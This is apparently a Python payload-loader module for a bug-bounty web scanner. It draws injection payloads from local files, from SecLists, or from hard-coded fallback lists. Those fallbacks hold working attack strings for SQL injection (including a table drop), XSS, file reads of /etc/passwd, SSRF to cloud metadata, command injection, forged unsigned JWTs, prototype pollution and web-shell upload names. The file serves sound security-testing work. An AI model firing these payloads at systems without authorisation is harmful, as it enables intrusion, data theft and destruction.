"""
Payload Loader — Central payload management for all bugbounty scanners.

Priority order:
  1. sentinel_proxy/payloads/<type>.txt  — our own 34K curated payloads
  2. /usr/share/seclists/...             — SecLists (Kali/Arch standard)
  3. Hardcoded fallback                  — always works, no deps

Usage:
    from modules.bugbounty.payload_loader import load_payloads
    sqli   = load_payloads('sqli',   limit=50)
    xss    = load_payloads('xss',    limit=30)
    lfi    = load_payloads('lfi',    limit=40)
    ssrf   = load_payloads('ssrf')
    ssti   = load_payloads('ssti')
    xxe    = load_payloads('xxe')
    rce    = load_payloads('rce',    limit=20)
    cors   = load_payloads('cors')
    crlf   = load_payloads('crlf')
    redirect = load_payloads('open_redirect')
    proto  = load_payloads('prototype_pollution')
    smuggle = load_payloads('smuggling')
    nosql  = load_payloads('nosql')
    jwt    = load_payloads('jwt')
    oauth  = load_payloads('oauth')
    graphql = load_payloads('graphql')
    path   = load_payloads('path_traversal', limit=100)
"""

import logging
from pathlib import Path
from functools import lru_cache

logger = logging.getLogger(__name__)

# ── Scan Depth Limits ───────────────────────────────────────────────────────────────────────────────────
#
# FAST   — quick scan, top payloads only (~30 sec per target)
# NORMAL — balanced scan, good coverage (~2-3 min per target)  [DEFAULT]
# DEEP   — full wordlist, maximum coverage (~10+ min per target)
#
SCAN_DEPTH = 'NORMAL'   # change to 'FAST' or 'DEEP' as needed

DEPTH_LIMITS = {
    #                FAST   NORMAL   DEEP
    'sqli':         (  15,     50,      0),
    'xss':          (  10,     40,      0),
    'lfi':          (  10,     30,      0),
    'path_traversal':(  8,     25,      0),  # 22K payloads — must limit!
    'ssrf':         (   8,     20,      0),
    'ssti':         (   8,      8,      0),  # small list, use all
    'rce':          (  10,     30,      0),
    'cors':         (   5,     15,      0),
    'crlf':         (   5,     15,      0),
    'open_redirect':(   5,     15,      0),
    'prototype_pollution': (5, 15,     0),
    'smuggling':    (   4,     10,      0),
    'nosql':        (   5,     15,      0),
    'jwt':          (   5,     10,      0),
    'oauth':        (   4,      6,      0),
    'graphql':      (   5,     10,      0),
    'xpath':        (   5,     10,      0),
    'ldap':         (   5,     15,      0),
    'css_injection':(   5,     10,      0),
    'file_upload':  (   5,     15,      0),
    'xxe':          (   0,      0,      0),
}


def get_limit(payload_type: str, override: int = 0) -> int:
    """Return payload limit based on current SCAN_DEPTH."""
    if override:
        return override
    limits = DEPTH_LIMITS.get(payload_type, (20, 50, 0))
    idx = {'FAST': 0, 'NORMAL': 1, 'DEEP': 2}.get(SCAN_DEPTH, 1)
    return limits[idx]

# ── Paths ──────────────────────────────────────────────────────────────────────

import config as _config
_BASE_DIR    = _config.get_base_dir()
_PROXY_DIR   = _BASE_DIR / 'sentinel_proxy' / 'payloads'

# SecLists locations (Kali default + Arch/custom)
_SECLISTS_ROOTS = [
    Path('/usr/share/seclists'),
    Path('/usr/share/SecLists'),
    Path('/opt/seclists'),
    Path('/opt/SecLists'),
]

# Map: payload_type → (proxy_file, seclists_relative_path, hardcoded_fallback)
_PAYLOAD_MAP = {
    'sqli': (
        'sqli.txt',
        'Fuzzing/SQLi/Generic-SQLi.txt',
        ["'", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "' AND SLEEP(4)--",
         "'; WAITFOR DELAY '0:0:4'--", "' AND pg_sleep(4)--", "1' ORDER BY 1--",
         "1' UNION SELECT NULL--", "' OR '1'='1'--", "admin'--", "1; DROP TABLE users--"],
    ),
    'xss': (
        'xss.txt',
        'Fuzzing/XSS/XSS-Jhaddix.txt',
        ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
         "'><script>alert(1)</script>", "<svg onload=alert(1)>",
         "javascript:alert(1)", "\"><img src=x onerror=alert(1)>",
         "<body onload=alert(1)>", "';alert(1)//"],
    ),
    'lfi': (
        'lfi.txt',
        'Fuzzing/LFI/LFI-Jhaddix.txt',
        ["../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
         "/etc/passwd", "..%2F..%2Fetc%2Fpasswd", "../../etc/passwd%00",
         "php://filter/convert.base64-encode/resource=index.php",
         "..\\..\\windows\\win.ini", "/proc/self/environ"],
    ),
    'path_traversal': (
        'path_traversal.txt',
        'Fuzzing/LFI/LFI-gracefulsecurity-windows.txt',
        ["../", "../../", "../../../", "..%2F", "..%252F",
         "..\\", "..%5C", "%2e%2e%2f", "%2e%2e/"],
    ),
    'ssrf': (
        'ssrf.txt',
        'Fuzzing/SSRF/SSRF-Testing.txt',
        ["http://169.254.169.254/latest/meta-data/",
         "http://127.0.0.1/", "http://[::1]/",
         "http://metadata.google.internal/computeMetadata/v1/",
         "http://192.168.0.1/", "http://10.0.0.1/",
         "http://0.0.0.0/", "http://localhost/"],
    ),
    'ssti': (
        'ssti.txt',
        None,
        [("{{7*7}}", "49", "Jinja2/Twig"), ("${7*7}", "49", "Freemarker"),
         ("#{7*7}", "49", "Ruby ERB"), ("<%= 7*7 %>", "49", "ERB"),
         ("{{7*'7'}}", "7777777", "Jinja2"), ("{7*7}", "49", "Smarty"),
         ("{{13*37}}", "481", "Jinja2 confirm"), ("#set($x=7*7)$x", "49", "Velocity")],
    ),
    'xxe': (
        'xxe.txt',
        None,
        None,  # XXE payloads are structured XML, not plain strings
    ),
    'rce': (
        'rce.txt',
        'Fuzzing/command-injection-commix.txt',
        ["; id", "| id", "` id`", "$(id)", "; cat /etc/passwd",
         "| cat /etc/passwd", "&& id", "|| id", "; whoami", "| whoami"],
    ),
    'cors': (
        'cors.txt',
        None,
        ["https://evil.com", "null", "https://attacker.com",
         "https://evil.example.com"],
    ),
    'crlf': (
        'crlf.txt',
        'Fuzzing/CRLF-Injection.txt',
        ["%0d%0aX-Injected: sentinel", "%0aX-Injected: sentinel",
         "\r\nX-Injected: sentinel", "%0d%0a%0d%0a<script>alert(1)</script>"],
    ),
    'open_redirect': (
        'open_redirect.txt',
        'Fuzzing/Open-Redirect.txt',
        ["https://evil.com", "//evil.com", "///evil.com",
         "/\\evil.com", "https://evil.com%2F@legitimate.com"],
    ),
    'prototype_pollution': (
        'prototype_pollution.txt',
        None,
        ["__proto__[sentinel]=polluted", "constructor[prototype][sentinel]=polluted",
         "__proto__[isAdmin]=true", "__proto__[role]=admin"],
    ),
    'smuggling': (
        'smuggling.txt',
        None,
        ["Transfer-Encoding: chunked", "Transfer-Encoding : chunked",
         "Transfer-Encoding: xchunked", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"],
    ),
    'nosql': (
        'nosql.txt',
        'Fuzzing/Databases/NoSQL.txt',
        ["' || '1'=='1", "{\"$gt\": \"\"}", "{\"$ne\": null}",
         "'; return true; var dummy='", "{\"$where\": \"1==1\"}"],
    ),
    'jwt': (
        'jwt.txt',
        None,
        ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
         "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."],
    ),
    'oauth': (
        'oauth.txt',
        None,
        ["https://evil.example.com/callback", "javascript:alert(1)",
         "//evil.com", "https://evil.com%2F@legitimate.com"],
    ),
    'graphql': (
        'graphql.txt',
        None,
        ["{__schema{types{name}}}", "{__typename}",
         "query{__schema{queryType{name}}}",
         "{user(id:1){id username email password}}"],
    ),
    'xpath': (
        'xpath.txt',
        None,
        ["' or '1'='1", "' or ''='", "x' or 1=1 or 'x'='y",
         "' and count(/*)=1 and '1'='1"],
    ),
    'ldap': (
        'ldap.txt',
        'Fuzzing/LDAP-Injection.txt',
        ["*)(uid=*))(|(uid=*", "*))(|(password=*", "*", "*()|%26'",
         "admin)(&)", "*(|(mail=*))"],
    ),
    'css_injection': (
        'css_injection.txt',
        None,
        ["</style><script>alert(1)</script>", "expression(alert(1))",
         "-moz-binding:url(//evil.com/xss.xml#xss)"],
    ),
    'file_upload': (
        'file_upload.txt',
        None,
        ["shell.php", "shell.php.jpg", "shell.phtml", "shell.php5",
         "shell.shtml", "../shell.php", "shell.php%00.jpg"],
    ),
}


@lru_cache(maxsize=64)
def _load_file(path: Path, limit: int) -> tuple:
    """Load payloads from file, return as tuple (for lru_cache hashability)."""
    try:
        lines = path.read_text(encoding='utf-8', errors='ignore').splitlines()
        payloads = [l.strip() for l in lines if l.strip() and not l.startswith('#')]
        if limit:
            payloads = payloads[:limit]
        return tuple(payloads)
    except Exception as e:
        logger.debug(f"Payload file load failed {path}: {e}")
        return ()


def _find_seclists(relative: str) -> Path | None:
    """Find a SecLists file across known installation roots."""
    for root in _SECLISTS_ROOTS:
        p = root / relative
        if p.exists():
            return p
    return None


def load_payloads(payload_type: str, limit: int = 0) -> list:
    """
    Load payloads for given type.

    Priority:
      1. sentinel_proxy/payloads/<type>.txt  (our curated 34K)
      2. SecLists (if installed)
      3. Hardcoded fallback

    Args:
        payload_type: sqli/xss/lfi/ssrf/ssti/rce/cors/crlf/open_redirect/
                      prototype_pollution/smuggling/nosql/jwt/oauth/graphql/
                      path_traversal/xpath/ldap/css_injection/file_upload/xxe
        limit: explicit limit (0 = use SCAN_DEPTH auto-limit)

    Returns:
        list of payload strings (or tuples for ssti)
    """
    if payload_type not in _PAYLOAD_MAP:
        logger.warning(f"Unknown payload type: {payload_type}")
        return []

    # Apply depth-based limit if no explicit limit given
    effective_limit = get_limit(payload_type, limit)

    proxy_file, seclists_rel, fallback = _PAYLOAD_MAP[payload_type]

    # SSTI returns structured tuples — special case
    if payload_type == 'ssti':
        return list(fallback) if fallback else []

    # XXE returns None — caller uses structured XML payloads directly
    if payload_type == 'xxe':
        return []

    # 1. Our proxy payloads (highest quality, curated)
    if proxy_file:
        proxy_path = _PROXY_DIR / proxy_file
        if proxy_path.exists():
            payloads = list(_load_file(proxy_path, effective_limit))
            if payloads:
                logger.debug(f"Payloads [{payload_type}]: {len(payloads)} from proxy dir (depth={SCAN_DEPTH})")
                return payloads

    # 2. SecLists
    if seclists_rel:
        sl_path = _find_seclists(seclists_rel)
        if sl_path:
            payloads = list(_load_file(sl_path, effective_limit))
            if payloads:
                logger.debug(f"Payloads [{payload_type}]: {len(payloads)} from SecLists")
                return payloads

    # 3. Hardcoded fallback
    if fallback:
        payloads = list(fallback)
        if effective_limit:
            payloads = payloads[:effective_limit]
        logger.debug(f"Payloads [{payload_type}]: {len(payloads)} from hardcoded fallback")
        return payloads

    return []


def payload_stats() -> dict:
    """Return count of available payloads per type — useful for status display."""
    stats = {}
    for ptype in _PAYLOAD_MAP:
        if ptype in ('ssti', 'xxe'):
            stats[ptype] = len(_PAYLOAD_MAP[ptype][2] or [])
            continue
        payloads = load_payloads(ptype)
        stats[ptype] = len(payloads)
    return stats
